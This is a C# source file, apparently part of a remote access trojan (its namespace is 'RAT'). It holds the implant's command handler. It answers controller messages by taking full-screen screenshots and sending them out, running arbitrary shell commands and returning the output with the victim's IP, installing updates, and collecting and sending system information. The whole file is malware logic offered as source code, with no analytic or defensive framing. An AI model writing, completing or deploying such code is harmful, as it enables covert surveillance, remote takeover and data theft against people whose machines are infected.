using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RAT
{ 
    public class TCPInterpreter
    {
        public static void main(String data)
        {
            if (data.Contains("<HEARTBEAT>"))
            {
                String command = data.Substring(data.IndexOf("<HEARTBEAT>") + 12).Replace("<EOF>", "");
                Console.WriteLine("Heartbeat From " + command);
            }
            if (data.Contains("<SCREENSHOTREQ>"))
            {
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    try
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                        }
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bitmap.Save(ms, ImageFormat.Png);
                            byte[] imageBuffer = ms.GetBuffer();
                            Payload.Send("<SCREENSHOT> "+ Convert.ToBase64String(imageBuffer));
                        }
                    }
                    catch
                    {
                        Console.WriteLine("<SCREENSHOT> Screenshot Error");
                    }

                }
            }
                  if (data.Contains("<EXECREQ>"))
                {
                try
                {
                    String command = data.Substring(data.IndexOf("<EXECREQ>") + 10).Replace("<EOF>", "");
                    String output = Shell.Exec(command);
                    Payload.Send("<EXEC>" + " Command Executed On: " + Payload.LocalIP + "\n" + command + "\nOutput\n" + output);
                }catch (Exception error)
                {
                    Payload.Send("<EXEC>" + " Command Executed On: " + Payload.LocalIP + "\n" + data.Substring(data.IndexOf("<EXECREQ>") + 10).Replace("<EOF>", "") + "\nOutput\n" + error);
                }
                }
            if (data.Contains("<UPDATEREQ>"))
            {
                try
                {
                    String command = data.Substring(data.IndexOf("<UPDATEREQ>") + 12).Replace("<EOF>", "");
                    String output = Updater.install(command);
                }
                catch (Exception error)
                {
                }
            }
            if (data.Contains("<INFOGATHERREQ>"))
            {
                try
                {
                    String command = data.Substring(data.IndexOf("<INFOGATHERREQ>") + 16).Replace("<EOF>", "");
                    InfoGather.gather();
                    Payload.Send(InfoGather.read());
                }
                catch (Exception error)
                {
                }
            }
        }
    }
}
